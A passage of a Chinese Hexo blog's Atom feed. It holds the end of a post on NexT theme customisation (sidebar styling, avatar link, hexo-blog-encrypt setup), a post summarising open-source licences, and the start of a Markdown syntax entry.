&#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;&amp;&#x989C;&#x8272;</h5><p>&#x4FA7;&#x8FB9;&#x680F;&#x6837;&#x5F0F;&#x6587;&#x4EF6;<code>\themes\next\source\css\_common\components\sidebar\sidebar.styl</code></p><pre><code class="CSS">    .sidebar {        position: fixed;        right: 0;        top: 0;        bottom: 0;        background: url(&#x56FE;&#x7247;&#x5730;&#x5740;.jpg) no-repeat !important;        background-size: cover !important;    }</code></pre><h5 id="2-9-&#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;"><a href="#2-9-&#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;" class="headerlink" title="2.9 &#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;"></a>2.9 &#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;</h5><p>&#x6253;&#x5F00;<code>\next\source\css\_common\components\sidebar\sidebar-author.styl</code>&#xFF1B;<br>&#x5728;<code>.site-author-image</code>&#x53D8;&#x91CF;&#x5185;&#x6DFB;&#x52A0;<code>cursor: pointer;</code>&#x4FEE;&#x6539;&#x9F20;&#x6807;&#x6837;&#x5F0F;&#xFF1B;<br>&#x6253;&#x5F00;<code>\next\source\js\src\motion.js</code>&#xFF0C;&#x5728;&#x9876;&#x90E8;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><pre><code class="JavaScript">    $(&apos;.site-author-image&apos;).click(function(){      window.location.href=&quot;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;&#x63A5;&quot;;    });</code></pre><h3 id="3-0-&#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;"><a href="#3-0-&#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;" class="headerlink" title="3.0 &#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;"></a>3.0 &#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD;</h3><blockquote><p>Hexo&#x7684;&#x6587;&#x7AE0;&#x52A0;&#x5BC6;&#x6211;&#x77E5;&#x9053;&#x7684;&#x6709;&#x4E24;&#x79CD;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x8BB2;<code>hexo-blog-encrypt</code> &#x7684;&#x4F7F;&#x7528;<br>&#x4F60;&#x5199;&#x4E86;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x51FA;&#x4E8E;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x592A;&#x5E0C;&#x671B;&#x6BCF;&#x4E00;&#x4E2A;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x3002;<br>&#x6240;&#x4EE5;&#x4F60;&#x5E38;&#x5E38;&#x4F1A;&#x4E3A;&#x8FD9;&#x79CD;&#x6587;&#x7AE0;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x624D;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x3002;<br>&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x53C2;&#x8003;&#xFF1A;<a href="https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md" target="_blank" rel="noopener">https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md</a></p></blockquote><h5 id="3-1-&#x5B89;&#x88C5;"><a href="#3-1-&#x5B89;&#x88C5;" class="headerlink" title="3.1 &#x5B89;&#x88C5;"></a>3.1 &#x5B89;&#x88C5;</h5><ul><li>&#x5728;hexo&#x6839;&#x76EE;&#x5F55;&#x7684;<code>package.json</code>&#x6587;&#x4EF6;&#x4E2D;&#x7684;<code>dependencies</code>&#x6DFB;&#x52A0;<code>&quot;hexo-blog-encrypt&quot;: &quot;1.1.*&quot;,</code></li><li><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x5C3D;&#x91CF;&#x6DFB;&#x52A0;&#x5728;&#x5F00;&#x5934;&#xFF0C;&#x4E0D;&#x8981;&#x52A0;&#x5728;&#x5E95;&#x90E8;</li><li>&#x7136;&#x540E;&#x6267;&#x884C;<code>npm install</code>&#x547D;&#x4EE4;</li><li>&#x8BE5;&#x63D2;&#x4EF6;&#x4F1A;&#x81EA;&#x52A8;&#x5B89;&#x88C5;</li></ul><h5 id="3-2-&#x5FEB;&#x901F;&#x5F00;&#x59CB;"><a href="#3-2-&#x5FEB;&#x901F;&#x5F00;&#x59CB;" class="headerlink" title="3.2 &#x5FEB;&#x901F;&#x5F00;&#x59CB;"></a>3.2 &#x5FEB;&#x901F;&#x5F00;&#x59CB;</h5><ul><li>&#x9996;&#x5148;&#x5728;<code>_config.yml</code>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x542F;&#x7528;&#x63D2;&#x4EF6;</li></ul><pre><code># Security##encrypt:  enable: true</code></pre><ul><li>&#x7136;&#x540E;&#x5728;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x7684;&#x5934;&#x90E8;&#x4E0A;&#x52A0;&#x4E0A;&#x5BF9;&#x5E94;&#x5B57;&#x6BB5;&#xFF1A;</li></ul><pre><code>---title: hello worlddate: 2016-03-30 21:18:02tags:  - fdsafsdafpassword: 123456abstract: Welcome to my blog, enter password to read.message: Welcome to my blog, enter password to read.---</code></pre><ul><li>password: &#x662F;&#x8BE5;&#x535A;&#x5BA2;&#x52A0;&#x5BC6;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801;</li><li>abstract: &#x662F;&#x8BE5;&#x535A;&#x5BA2;&#x7684;&#x6458;&#x8981;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x5728;&#x535A;&#x5BA2;&#x7684;&#x5217;&#x8868;&#x9875;</li><li>message: &#x8FD9;&#x4E2A;&#x662F;&#x535A;&#x5BA2;&#x67E5;&#x770B;&#x65F6;&#xFF0C;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x6846;&#x4E0A;&#x9762;&#x7684;&#x63CF;&#x8FF0;&#x6027;&#x6587;&#x5B57;</li></ul><h3 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h3><p><strong>&#x7ED9;&#x51FA;&#x4E00;&#x4E9B;&#x6574;&#x7406;&#x7684;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x6587;&#x7AE0;</strong><br><a href="http://www.iamlj.com/2016/08/add-special-effect-harlem-shake-for-hexo/" target="_blank" rel="noopener">&#x4E3A;Hexo NexT&#x4E3B;&#x9898;&#x6DFB;&#x52A0;&#x54C8;&#x6797;&#x6447;&#x7279;&#x6548;</a><br><a href="http://shenzekun.cn/h-exo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">hexo&#x7684;next&#x4E3B;&#x9898;&#x4E2A;&#x6027;&#x5316;&#x6559;&#x7A0B;&#xFF1A;&#x6253;&#x9020;&#x70AB;&#x9177;&#x7F51;&#x7AD9;| Moorez</a><br><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">&#x6253;&#x9020;&#x4E2A;&#x6027;&#x8D85;&#x8D5E;&#x535A;&#x5BA2;Hexo+NexT+GitHubPages</a><br><a href="http://mashirosorata.vicp.io/HEXO-NEXT%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE.html" target="_blank" rel="noopener">HEXO+NEXT&#x4E3B;&#x9898;&#x4E2A;&#x6027;&#x5316;&#x914D;&#x7F6E;| SORA</a><br><code>&#x5B98;&#x65B9;</code><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT &#x4F7F;&#x7528;&#x6587;&#x6863;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      Hexo和NexT主题
    
    </summary>
    
      <category term="前端" scheme="https://marnm.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Hexo" scheme="https://marnm.github.io/tags/Hexo/"/>
    
      <category term="NexT" scheme="https://marnm.github.io/tags/NexT/"/>
    
  </entry>
  
  <entry>
    <title>Linux学习笔记 - 关于开源</title>
    <link href="https://marnm.github.io//posts/67ee4dec/"/>
    <id>https://marnm.github.io//posts/67ee4dec/</id>
    <published>2018-07-10T12:55:02.000Z</published>
    <updated>2020-04-09T11:50:11.075Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-&#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;"><a href="#1-&#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;" class="headerlink" title="1. &#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;"></a>1. &#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;</h3><p><strong>&#x4F4E;&#x98CE;&#x9669;&#xFF1A;</strong>&#x4F7F;&#x7528;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x65E0;&#x7591;&#x628A;&#x547D;&#x8FD0;&#x4EA4;&#x4ED8;&#x7ED9;&#x4ED6;&#x4EBA;&#xFF0C;&#x4E00;&#x65E6;&#x5C01;&#x95ED;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x6CA1;&#x6709;&#x4EBA;&#x6765;&#x7EF4;&#x62A4;&#xFF0C;&#x4F60;&#x5C06;&#x8FDB;&#x9000;&#x7EF4;&#x8C37;&#xFF1B;&#x800C;&#x4E14;&#x76F8;&#x8F83;&#x4E8E;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x516C;&#x53F8;&#xFF0C;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x5F88;&#x5C11;&#x5B58;&#x5728;&#x5012;&#x95ED;&#x7684;&#x95EE;&#x9898;&#x3002;</p><p><strong>&#x9AD8;&#x54C1;&#x8D28;&#xFF1A;</strong>&#x76F8;&#x8F83;&#x4E8E;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x4EA7;&#x54C1;&#xFF0C;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x901A;&#x5E38;&#x662F;&#x7531;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x6765;&#x7814;&#x53D1;&#x53CA;&#x7EF4;&#x62A4;&#x7684;&#xFF0C;&#x53C2;&#x4E0E;&#x7F16;&#x5199;&#x3001;&#x7EF4;&#x62A4;&#x3001;&#x6D4B;&#x8BD5;&#x7684;&#x7528;&#x6237;&#x91CF;&#x4F17;&#x591A;&#xFF0C;&#x4E00;&#x822C;&#x7684;bug&#x8FD8;&#x6CA1;&#x6709;&#x7B49;&#x7206;&#x53D1;&#x5C31;&#x5DF2;&#x7ECF;&#x88AB;&#x4FEE;&#x8865;&#x3002;</p><p><strong>&#x4F4E;&#x6210;&#x672C;&#xFF1A;</strong>&#x5F00;&#x6E90;&#x5DE5;&#x4F5C;&#x8005;&#x90FD;&#x662F;&#x5728;&#x5E55;&#x540E;&#x9ED8;&#x9ED8;&#x4E14;&#x65E0;&#x507F;&#x5730;&#x4ED8;&#x51FA;&#x52B3;&#x52A8;&#x6210;&#x679C;&#xFF0C;&#x4E3A;&#x7F8E;&#x597D;&#x7684;&#x4E16;&#x754C;&#x8D21;&#x732E;&#x4E00;&#x4EFD;&#x529B;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x4F7F;&#x7528;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x63A8;&#x52A8;&#x7684;&#x8F6F;&#x4EF6;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x8282;&#x7701;&#x5927;&#x91CF;&#x7684;&#x4EBA;&#x529B;&#x3001;&#x7269;&#x529B;&#x548C;&#x8D22;&#x529B;&#x3002;</p><p><strong>&#x66F4;&#x900F;&#x660E;&#xFF1A;</strong>&#x6CA1;&#x6709;&#x54EA;&#x4E2A;&#x7B28;&#x86CB;&#x4F1A;&#x628A;&#x6728;&#x9A6C;&#x3001;&#x540E;&#x95E8;&#x7B49;&#x653E;&#x5230;&#x5F00;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x65E0;&#x7591;&#x662F;&#x628A;&#x81EA;&#x5DF1;&#x7684;&#x7F6A;&#x884C;&#x66B4;&#x9732;&#x5728;&#x9633;&#x5149;&#x4E4B;&#x4E0B;&#x3002;</p><p>&#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x4E3A;&#x4E86;&#x5355;&#x7EAF;&#x8FFD;&#x6C42;&#x201C;&#x81EA;&#x7531;&#x201D;&#x800C;&#x727A;&#x7272;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x5229;&#x76CA;&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x5F71;&#x54CD;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x521B;&#x9020;&#x6FC0;&#x60C5;&#xFF0C;&#x56E0;&#x6B64;&#x4E16;&#x754C;&#x4E0A;&#x73B0;&#x5728;&#x6709;60&#x591A;&#x79CD;&#x88AB;&#x5F00;&#x6E90;&#x4FC3;&#x8FDB;&#x7EC4;&#x7EC7;&#xFF08;Open Source Initiative&#xFF09;&#x8BA4;&#x53EF;&#x7684;&#x5F00;&#x6E90;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x6765;&#x4FDD;&#x8BC1;&#x5DE5;&#x4F5C;&#x8005;&#x7684;&#x6743;&#x76CA;&#x3002;&#x5BF9;&#x4E8E;&#x90A3;&#x4E9B;&#x53EA;&#x77E5;&#x9053;&#x4E00;&#x5473;&#x6284;&#x88AD;&#x3001;&#x7BE1;&#x6539;&#x3001;&#x7834;&#x89E3;&#x6216;&#x8005;&#x76D7;&#x7248;&#x4ED6;&#x4EBA;&#x4F5C;&#x54C1;&#x7684;&#x4EBA;&#xFF0C;&#x7EC8;&#x5F52;&#x4F1A;&#x5728;&#x67D0;&#x4E00;&#x5929;&#x6536;&#x5230;&#x6CD5;&#x9662;&#x7684;&#x4F20;&#x7968;&#x3002;</p><a id="more"></a><hr><p><strong>GNU GPL (GNU General Public License , GNU&#x901A;&#x7528;&#x516C;&#x5171;&#x8BB8;&#x53EF;&#x8BC1;)&#xFF1A;</strong>&#x53EA;&#x8981;&#x54E6;&#x8F6F;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x4E86;&#x9075;&#x5FAA;GPL&#x534F;&#x8BAE;&#x7684;&#x4EA7;&#x54C1;&#x6216;&#x4EE3;&#x7801;&#xFF0C;&#x8BE5;&#x8F6F;&#x4EF6;&#x5C31;&#x5FC5;&#x987B;&#x9075;&#x5FAA;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x4E14;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x5E76;&#x4E0D;&#x9002;&#x5408;&#x5546;&#x7528;&#x8F6F;&#x4EF6;&#x3002;&#x9075;&#x5FAA;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x6570;&#x91CF;&#x53CA;&#x5176;&#x5E9E;&#x5927;&#xFF0C;&#x5305;&#x62EC;Linux&#x7CFB;&#x7EDF;&#x5728;&#x5185;&#x7684;&#x5927;&#x591A;&#x6570;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x7684;&#x3002;</p><p><img src="https://docs.blender.org/manual/zh-hans/dev/_images/getting-started_about_license_gnu-logo.png" alt="GNU"></p><ul><li><strong>&#x590D;&#x5236;&#x81EA;&#x7531;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x5427;&#x8F6F;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x4EFB;&#x4F55;&#x4EBA;&#x7684;&#x7535;&#x8111;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x9650;&#x590D;&#x5236;&#x7684;&#x6570;&#x91CF;</li><li><strong>&#x4F20;&#x64AD;&#x81EA;&#x7531;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x8F6F;&#x4EF6;&#x4EE5;&#x5404;&#x79CD;&#x5F62;&#x5F0F;&#x4F20;&#x64AD;</li><li><strong>&#x6536;&#x8D39;&#x4F20;&#x64AD;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x5728;&#x5404;&#x79CD;&#x5A92;&#x4ECB;&#x4E0A;&#x51FA;&#x552E;&#x8BE5;&#x8F6F;&#x4EF6;&#xFF0C;&#x4F46;&#x5FC5;&#x987B;&#x63D0;&#x524D;&#x8BA9;&#x4E70;&#x5BB6;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x8F6F;&#x4EF6;&#x662F;&#x53EF;&#x4EE5;&#x514D;&#x8D39;&#x83B7;&#x5F97;&#x7684;&#xFF1B;&#x56E0;&#x6B64;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6709;&#x507F;&#x670D;&#x52A1;&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x76C8;&#x5229;&#x7684;&#x3002;</li><li><strong>&#x4FEE;&#x6539;&#x81EA;&#x7531;&#xFF1A;</strong>&#x5141;&#x8BB8;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x589E;&#x52A0;&#x6216;&#x5220;&#x9664;&#x8F6F;&#x4EF6;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x8F6F;&#x4EF6;&#x4FEE;&#x6539;&#x540E;&#x5FC5;&#x987B;&#x4F9D;&#x7136;&#x57FA;&#x4E8E;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x6388;&#x6743;</li></ul><hr><p><strong>BSD(Berkeley Software Distribution&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248;)&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;</strong></p><p>&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3001;&#x4FEE;&#x6539;&#x548C;&#x91CD;&#x65B0;&#x53D1;&#x5E03;&#x9075;&#x5FAA;&#x8BE5;&#x8BB8;&#x53EF;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5C06;&#x8F6F;&#x4EF6;&#x4F5C;&#x4E3A;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x548C;&#x9500;&#x552E;&#xFF0C;&#x524D;&#x63D0;&#x662F;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E0B;&#x9762;3&#x4E2A;&#x6761;&#x4EF6;&#x3002;</p><p><img src="https://qph.fs.quoracdn.net/main-thumb-t-14907-200-seTLViB8UWkDHk3At9asR1xYPu5k6spg.jpeg" alt="BSD&#xFF0C;&#x4F2F;&#x514B;&#x5229;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x7248;"></p><p>&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x5219;&#x6E90;&#x4EE3;&#x7801;&#x5FC5;&#x987B;&#x7EE7;&#x7EED;&#x9075;&#x5FAA;BSD&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;<br>&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x53EA;&#x6709;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5728;&#x76F8;&#x5173;&#x6587;&#x6863;&#x6216;&#x7248;&#x6743;&#x6587;&#x4EF6;&#x4E2D;&#x58F0;&#x660E;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x9075;&#x5FAA;&#x4E86;BSD&#x534F;&#x8BAE;&#x3002;<br>&#x4E0D;&#x5141;&#x8BB8;&#x7528;&#x539F;&#x59CB;&#x8F6F;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x3001;&#x4F5C;&#x8005;&#x540D;&#x5B57;&#x6216;&#x673A;&#x6784;&#x540D;&#x79F0;&#x8FDB;&#x884C;&#x5E02;&#x573A;&#x63A8;&#x5E7F;&#x3002;</p><hr><p><strong>Apache &#x8BB8;&#x53EF;&#x8BC1;&#x7248;&#x672C;&#xFF08;Apache License Version&#xFF09;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;</strong><br>&#x5728;&#x4E3A;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x63D0;&#x4F9B;&#x7248;&#x6743;&#x53CA;&#x4E13;&#x5229;&#x8BB8;&#x53EF;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x62E5;&#x6709;&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x53CA;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x81EA;&#x7531;&#x3002;&#x8BE5;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x9002;&#x7528;&#x4E8E;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#xFF0C;&#x73B0;&#x5728;&#x70ED;&#x95E8;&#x7684;Hadoop&#x3001;Apache HTTP Server&#x3001;MongoDB&#x7B49;&#x9879;&#x76EE;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8BE5;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x7814;&#x53D1;&#x7684;&#xFF0C;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x5728;&#x5F00;&#x53D1;&#x9075;&#x5FAA;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x8F6F;&#x4EF6;&#x65F6;&#xFF0C;&#x8981;&#x4E25;&#x683C;&#x9075;&#x5B88;&#x4E0B;&#x9762;&#x7684;4&#x4E2A;&#x6761;&#x4EF6;&#x3002;</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Apache_Software_Foundation_Logo_%282016%29.svg/1200px-Apache_Software_Foundation_Logo_%282016%29.svg.png" alt="Apache License"></p><p>&#x8BE5;&#x8F6F;&#x4EF6;&#x53CA;&#x5176;&#x884D;&#x751F;&#x54C1;&#x5FC5;&#x987B;&#x7EE7;&#x7EED;&#x4F7F;&#x7528;Apache&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;<br>&#x5982;&#x679C;&#x4FEE;&#x6539;&#x4E86;&#x7A0B;&#x5E8F;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6587;&#x6863;&#x4E2D;&#x8FDB;&#x884C;&#x58F0;&#x660E;&#x3002;<br>&#x82E5;&#x8F6F;&#x4EF6;&#x662F;&#x57FA;&#x4E8E;&#x4ED6;&#x4EBA;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x7F16;&#x5199;&#x800C;&#x6210;&#x7684;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4FDD;&#x7559;&#x539F;&#x59CB;&#x4EE3;&#x7801;&#x7684;&#x534F;&#x8BAE;&#x3001;&#x5546;&#x6807;&#x3001;&#x4E13;&#x5229;&#x58F0;&#x660E;&#x53CA;&#x5176;&#x4ED6;&#x539F;&#x4F5C;&#x8005;&#x58F0;&#x660E;&#x7684;&#x5185;&#x5BB9;&#x4FE1;&#x606F;&#x3002;<br>&#x5982;&#x679C;&#x518D;&#x53D1;&#x5E03;&#x7684;&#x8F6F;&#x4EF6;&#x4E2D;&#x6709;&#x58F0;&#x660E;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x5728;&#x6B64;&#x6587;&#x4EF6;&#x4E2D;&#x6807;&#x6CE8;Apache&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x53CA;&#x5176;&#x4ED6;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x3002;</p><hr><p><strong>MPL(Mozilla Public License&#xFF0C; Mozilla&#x516C;&#x5171;&#x8BB8;&#x53EF;)&#xFF1A;</strong></p><p>&#x76F8;&#x8F83;&#x4E8E;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF0C;MPL&#x66F4;&#x52A0;&#x6CE8;&#x91CD;&#x4E8E;&#x5BF9;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x9700;&#x6C42;&#x548C;&#x6536;&#x76CA;&#x4E4B;&#x95F4;&#x7684;&#x5E73;&#x8861;</p><hr><p><strong>MIT&#xFF08;Massachusetts Institute of Technology )&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#xFF1A;</strong></p><p>&#x76EE;&#x524D;&#x9650;&#x5236;&#x6700;&#x5C11;&#x7684;&#x5F00;&#x6E90;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x4E4B;&#x4E00;&#xFF0C;&#x53EA;&#x8981;&#x7A0B;&#x5E8F;&#x7684;&#x5F00;&#x53D1;&#x8005;&#x5728;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x4FDD;&#x7559;&#x539F;&#x4F5C;&#x8005;&#x7684;&#x8BB8;&#x53EF;&#x4FE1;&#x606F;&#x5373;&#x53EF;&#xFF0C;&#x56E0;&#x6B64;&#x666E;&#x904D;&#x88AB;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x6240;&#x4F7F;&#x7528;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-开源共享精神&quot;&gt;&lt;a href=&quot;#1-开源共享精神&quot; class=&quot;headerlink&quot; title=&quot;1. 开源共享精神&quot;&gt;&lt;/a&gt;1. 开源共享精神&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;低风险：&lt;/strong&gt;使用闭源软件无疑把命运交付给他人，一旦封闭的源代码没有人来维护，你将进退维谷；而且相较于商业软件公司，开源社区很少存在倒闭的问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;高品质：&lt;/strong&gt;相较于闭源软件产品，开源项目通常是由开源社区来研发及维护的，参与编写、维护、测试的用户量众多，一般的bug还没有等爆发就已经被修补。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;低成本：&lt;/strong&gt;开源工作者都是在幕后默默且无偿地付出劳动成果，为美好的世界贡献一份力量，因此使用开源社区推动的软件项目可以节省大量的人力、物力和财力。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;更透明：&lt;/strong&gt;没有哪个笨蛋会把木马、后门等放到开源代码中，这样无疑是把自己的罪行暴露在阳光之下。&lt;/p&gt;
&lt;p&gt;但是，如果开源软件为了单纯追求“自由”而牺牲程序员的利益，这将会影响程序员的创造激情，因此世界上现在有60多种被开源促进组织（Open Source Initiative）认可的开源许可协议来保证工作者的权益。对于那些只知道一味抄袭、篡改、破解或者盗版他人作品的人，终归会在某一天收到法院的传票。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="开源" scheme="https://marnm.github.io/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>Markdown 简明语法手册</title>
    <link href="https://marnm.github.io//posts/bff83912/"/>
    <id>https://marnm.github.io//posts/bff83912/</id>
    <published>2018-07-10T12:28:22.000Z</published>
    <updated>2020-04-09T11:50:11.079Z</updated>
    
